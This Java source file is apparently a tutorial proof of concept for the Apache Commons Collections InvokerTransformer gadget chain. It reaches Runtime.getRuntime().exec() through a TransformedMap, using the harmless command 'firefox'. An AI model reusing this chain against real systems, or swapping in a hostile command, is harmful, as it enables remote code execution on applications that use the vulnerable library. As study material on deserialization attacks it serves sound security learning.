package com.github.inza9hi.tutorial.poc.security;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.util.HashMap;
import java.util.Map;

/**
 * Created by lawulu on 15-11-24.
 * @see http://drops.wooyun.org/papers/10467?utm_source=tuicool&utm_medium=referral
 */
public class TransformerTest {
    public static void main(String[] args) {
        test2();
    }

    static void test1(){

        Transformer transform = new InvokerTransformer(
                "append",
                new Class[]{String.class},
                new Object[]{"exploitcat?"});
        Object newObject = transform.transform(new StringBuffer("your name is ")) ;
        System.out.println(newObject);

    }
    static void test2(){
        Transformer[] transformers = new Transformer[]{
        new ConstantTransformer(Runtime.class),
        new InvokerTransformer("getMethod", new Class[]{String.class,Class[].class},
        new Object[]{"getRuntime", new Class[0]}),
        new InvokerTransformer("invoke", new Class[]{Object.class,Object[].class},
        new Object[]{null, new Object[0]}),
        new InvokerTransformer("exec", new Class[]{String.class},
                new Object[]{"firefox"})};
        Transformer chain = new ChainedTransformer(transformers) ;
        Map innerMap = new HashMap() ;
        innerMap.put("name", "hello") ;
        Map outerMap = TransformedMap.decorate(innerMap, null, chain) ;
        Map.Entry elEntry = (Map.Entry) outerMap.entrySet().iterator().next() ;
        elEntry.setValue("hello") ;

    }
}
